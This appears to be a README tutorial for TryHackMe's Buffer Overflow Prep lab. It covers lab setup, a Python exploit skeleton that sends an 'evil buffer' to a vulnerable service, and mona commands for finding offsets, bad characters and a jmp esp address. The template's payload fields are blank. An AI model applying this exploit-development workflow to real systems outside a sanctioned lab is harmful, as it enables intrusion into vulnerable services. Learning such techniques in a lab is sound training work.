# Buffer-Overflow-Prep
We're going to learn how to solve 3 tryhackme's stack buffer overflow.

This is the link to the Tryhackme Machine: https://tryhackme.com/room/bufferoverflowprep

# Things that you will need:
You will need x32dbg made by therealdreg: https://github.com/therealdreg/x64dbg-exploiting

[![18eaa8e03e02775805ec70f088604676.png](https://i.postimg.cc/6qzWgzJ9/18eaa8e03e02775805ec70f088604676.png)](https://postimg.cc/Pvpn8W5c)

You will need your OpenVPN from Tryhackme: https://tryhackme.com/access

You will need wfreerdp to get "vulnerable_apps.zip"

You can get it from here: https://ci.freerdp.com/job/freerdp-nightly-windows/arch=win32,label=vs2013/

[![e73bc927e928e9aac8a53960cfb34a08.png](https://i.postimg.cc/15ts4G1q/e73bc927e928e9aac8a53960cfb34a08.png)](https://postimg.cc/kDkkpt4J)

# First Steps

Start the machine in Tryhackme.

Open your OpenVPN and wait to connect to the machine, so we can work.

After downloading it all, We will need to execute this comand on cmd: ```wfreerdp.exe /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea```

[![11fd449aa4140dac4f71db16bbe012b2.png](https://i.postimg.cc/XqgPgzMg/11fd449aa4140dac4f71db16bbe012b2.png)](https://postimg.cc/0KbZkZy6)

Once we connect to the Tryhackme Machine, we can start to work!

On the Desktop is "vulnerable_apps", so we can right click it and make it a zip.

[![ddf3a6b17b9494a291f4f5c02fa15903.png](https://i.postimg.cc/sDqYNJVP/ddf3a6b17b9494a291f4f5c02fa15903.png)](https://postimg.cc/fJ7S3mSk)

Then in the windows machine we can found that we can use Python27 then we can get "vulnerable_apps.zip" via http server.

So knowing this we use on the cmd: ```c:\Python27\python.exe -m SimpleHTTPServer```

[![8ec396ffd688f7e79111b8edcfb31b3c.png](https://i.postimg.cc/g0S83yB6/8ec396ffd688f7e79111b8edcfb31b3c.png)](https://postimg.cc/Z9NWSNmT)

Back on your Windows search on google: ```MACHINEIP:8000```

[![88368624e10a140e81068e70fcea41ac.png](https://i.postimg.cc/SQrqdZf5/88368624e10a140e81068e70fcea41ac.png)](https://postimg.cc/3WdPJF6C)

Download "vulnerable_apps.zip" and unzip it.

# Using x32dgb

We will need a script to execute an exploit on the "oscp.exe"

Tryhackme give us this:

```
import socket

ip = "MACHINE_IP" # Here introduce 127.0.0.1 for local or TryHackme's Machine IP
port = 1337

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

We will start trying the exploit doing it in local, so we neet to introduce in the parameter "ip" 127.0.0.1

Run the program, and open the file "oscp.exe" it is in this path: ```vulnerable-apps/vulnerable-apps/oscp/oscp.exe```

[![7ee528397d8b95aa959aefcb51bca05b.png](https://i.postimg.cc/W1S9zHgG/7ee528397d8b95aa959aefcb51bca05b.png)](https://postimg.cc/dhkRSnW3)

Then you will see something like this:

[![a5255baed8f1aee8570dc9f6c68715b7.png](https://i.postimg.cc/SR1SRLLQ/a5255baed8f1aee8570dc9f6c68715b7.png)](https://postimg.cc/YLgKyWyT)

# Useful codes for x32dgb using mona

```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
--------------------------------------------------------------------------------

mona.mona("pattern_create 2000")

mona.mona('bytearray -cpb "\\x00"')

mona.mona('compare -f C:\\logs\\oscp\\bytearray.bin -a ESP')

mona.mona("pattern_offset EIP")

mona.mona("jmp -r esp") 
```

# Starting with x32dgb on "oscp.exe"

Go to Log inside of x32dgb when "oscp.exe" it's open and execute this 3 commands one by one:

```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
```
